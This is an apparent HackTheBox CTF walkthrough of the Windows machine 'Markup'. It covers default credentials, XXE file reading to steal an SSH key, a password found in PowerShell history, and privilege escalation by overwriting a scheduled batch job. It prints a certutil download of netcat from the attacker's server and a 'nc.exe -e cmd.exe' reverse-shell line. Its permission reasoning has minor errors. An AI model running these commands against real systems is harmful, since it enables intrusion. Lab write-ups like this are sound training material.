---
title: "HackTheBox - Very Easy - Markup"
date: 2022-03-22 15:42:59 -0700
categories: [CTF,HackTheBox]
tags: [windows, XML External Entities (XXE / XEE), LFI, Winodws PrivEsc, Service Binary Hijacking ]
---

![Markup](/assets/img/ctf/htb/very-easy/markup/1.png)

# Initial Intel
* Difficulty: Very Easy

# tl;dr
<details><summary>Spoilers</summary>
* SSH and a webserver on :80 are active<br/>
* default creds to get into the webapp</br>
* View page source for a username & XXE vector<br/>
* Use Burspuite to intercept and edit the XML sent to the webapp <br/>
* use XXE to LFI the known user's SSH key<br/>
* SSH as user and enumerate C:\Log-Management for an editable .bat file<br/>
* transfer nc over and edit the .bat file to get admin shell
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $markup
```

Looks like SSH and a webserver (TCP 80 & 443) are both available. 


```bash
PORT    STATE SERVICE  REASON          VERSION                                                                                                                                                                           
22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)                                                                                                                                           
80/tcp  open  http     syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)                                                                                                                          
|_http-title: MegaShopping                                                                                                                                                                                               
443/tcp open  ssl/http syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) 
```

I don't see any exploits available based off this info. I'll enumerate the webapp next.

#### Webapp Enumeration

Navigating in-browser to the app gets us a login Page. I run ferox buster to enum any directories, pages, or files in the meantime:

![Webapp Login](/assets/img/ctf/htb/very-easy/markup/2.png)

```bash
┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
└─$ feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
```

But this doesn't seem to reveal anything interseting. I also viewed the HTML source for version or other interesting information, but couldn't find anything.

Next thing I'll try is to use default creds. My goto is always admin:password and it works right off the bat.

![Logged in](/assets/img/ctf/htb/very-easy/markup/3.png)

First, I'll walk the app and explore each tab, making sure to view source for each and test any interactive features.

![Order Page](/assets/img/ctf/htb/very-easy/markup/4_0.png)

The order page has the only discernable feature that 'does something' when the form is submitted. A popup appears when any values are entered. This page warrants a closer look by viewing the source:

![Order page source](/assets/img/ctf/htb/very-easy/markup/4.png)

A name is mentioned. I'll note that down for future enumeration.

Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attacks if the server does not have proper protections in place:

![Order page source - XML](/assets/img/ctf/htb/very-easy/markup/5.png)

### XML External Entity (XXE / XEE) Abuse

Did some reading here: <a href="https://angelica.gitbook.io/hacktricks/pentesting-web/xxe-xee-xml-external-entity" alt='Hacktricks XXE XEE'>Hacktricks XXE / XEE</a>

After launching Burpsuite and starting Intercept:

![Capturing the XML data](/assets/img/ctf/htb/very-easy/markup/6.png)

1. I turned on my proxy in-browser
2. Fill in dummy data
3. Submit 

![Intercept](/assets/img/ctf/htb/very-easy/markup/7.png)

Once we've captured the XML, send it to the repeater for manipulation.

![XXE / XEE Exploit](/assets/img/ctf/htb/very-easy/markup/8.png)

1. The external entity is defined here. NOTE: for Windows paths, forward slashes seem to work, whereas backslashes do not.
2. We need to insert the entity object inside an existing data object. The 'payload' object defined is inserted here with a prefix '&' and a suffix ';'
3. We get LFI of the hosts file, proving we can leverage this exploit further for sensitve files

So, how can we further leverage this vector for a foothold? Let's review some info we've enumerated already:

1. SSH is enabled
2. We have a username *Daniel*
3. We can perform LFI to get sensitive files.

## Foothold

Whenever LFI is possible AND we know SSH is enabled, we should always try to get SSH keys. Let's try to get Daniel's.

![SSH Key](/assets/img/ctf/htb/very-easy/markup/9.png)

Nice, we were able to get their key. Pop that into a local id_rsa file and remember to change the permissions!

```bash
┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
└─$ chmod 600 id_rsa

┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]                                                                                                                                                                      
└─$ ssh -i id_rsa daniel@$markup                                                                                                                                                                                         
The authenticity of host '10.129.179.78 (10.129.179.78)' can't be established.                                                                                                                                           
ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.                                                                                                                                           
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:95: [hashed name]
    ~/.ssh/known_hosts:116: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.179.78' (ED25519) to the list of known hosts.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

Foothold established as user daniel.

```bash
daniel@MARKUP C:\Users\daniel>whoami /priv && whoami /groups                                                                                                                                                             
                                                                                                                                                                                                                         
PRIVILEGES INFORMATION                                                                                                                                                                                                   
----------------------                                                                                                                                                                                                   

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

**I like to switch to powershell once I get onto a Windows system and made it a habit.**

After some initial enum, there appears to be nothing else special about the daniel account. I'll enumerate the system after grabbing the user flag:

```bash
daniel@MARKUP C:\Users\daniel>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\daniel> cat .\Desktop\user.txt 
******************************8ef7  
```

I did run winPEAS but the only promising finding was the user's PS history file.

*I export winPEAS output to a file while also streaming it to console. Using the below method exports the info while preserving color data for review on my host machine*

```bash
$env:TERM = "xterm"
.\winPEASx64.exe 2>&1 | ForEach-Object { $_; $_ } > winpeas_raw.txt
cp winpeas_raw.txt \\10.10.16.18\attacker
```

![PS History File](/assets/img/ctf/htb/very-easy/markup/10.png)

```bash
PS C:\Users\daniel> cat C:\Users\daniel\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
.
.
.
$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cred -WorkingDirectory c:\users\daniel\documents
exit
```

There does appear to be a password. Let's save that to passwords.txt for good practice, but right now it doesn't offer any other lateral vectors.


## Lateral Movement / Privilege Escalation

Checking the C:\ drive is next. There are two dirs that stand out: *Log-Management* and *xampp*

```bash                                                                        
PS C:\Users\daniel> ls c:\                                                                             


    Directory: C:\ 


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/12/2020   3:56 AM                Log-Management
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---        7/28/2021   2:01 AM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---         3/5/2020   4:40 AM                Users
d-----        7/28/2021   2:16 AM                Windows
d-----         3/5/2020   9:15 AM                xampp
-a----        7/28/2021   3:38 AM              0 Recovery.txt
```

First I checked the MySQL DB for users / creds, but I did not find anything in any of the databases/tables:

```bash
PS C:\Users\daniel> C:\xampp\mysql\bin\mysql.exe -u root 

Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                                                                                                                              
Your MariaDB connection id is 8
Server version: 10.4.11-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| goods              |                                 
| information_schema |                                 
| mysql              |                                 
| performance_schema |                                 
| phpmyadmin         |                                 
| test               |                                 
+--------------------+                                 
6 rows in set (0.009 sec)    
```

So that makes *C:\Log-Management\* as my next enumeration target.

```bash
PS C:\Users\daniel> ls C:\Log-Management\


    Directory: C:\Log-Management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/6/2020   1:42 AM            346 job.bat
```

There is a *.bat* file. **When I see .bat files or custom .exes in unusual directories, I think of *Service Binary Hijacking* or similar**.

```bash
PS C:\Users\daniel> cd C:\Log-Management\

PS C:\Log-Management> cat .\job.bat
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

When checking the file contents, it seems that this file needs to *run as admin*. So if this file runs under admin context AND it may be scheduled to run, we should definitely try to edit the file with a payload. Can we edit it?

```bash
PS C:\Log-Management> icacls.exe .\job.bat
.\job.bat BUILTIN\Users:(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Administrators:(I)(F)
          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Log-Management>
```

*BUILTIN\Users:(I)(RX)* can edit the file. That means our user context *daniel* can edit the file.

Let's try to edit the file to call netcat for a revshell.

## Root / SYSTEM

```bash 
# start a httpserver on your $attacker. My port is at :8000
PS C:\Log-Management>certutil -f urlcache http://10.10.14.18:8000/win/nc64.exe .\nc.exe
```

Start your local listener. Mine is set for :4444

```bash
┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
└─$ sudo rlwrap nc -lvnp 4444
[sudo] password for haunter: 
listening on [any] 4444 ...
```

Now I'll try to replace the contents of *job.bat*. NOTE: Due to how Powershell handles special characters/escaping, I had to exit Powershell and run the following from cmd instead:

```bash
PS C:\Log-Management> exit

daniel@MARKUP C:\Users\daniel>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.18 4444 > C:\LogManagement\job.bat
```

And then wait to see if there is a schedule to launch the revshell...

![Admin Shell](/assets/img/ctf/htb/very-easy/markup/admin.png)

Success. After collecting the administrator.txt flag we've completed Markup.


# Lessons Learned
* XML can lead to XXE / XEE, which can lead to LFI
* Enumerate odd directories. If we see custom .bat or .exe files, check permissions to see if we can edit the file
* Even if we can't see a process since it may be running as admin, context may provide clues it is scheduled to run as admin
* when edit files with piped input, cmd is preffered over Powershell
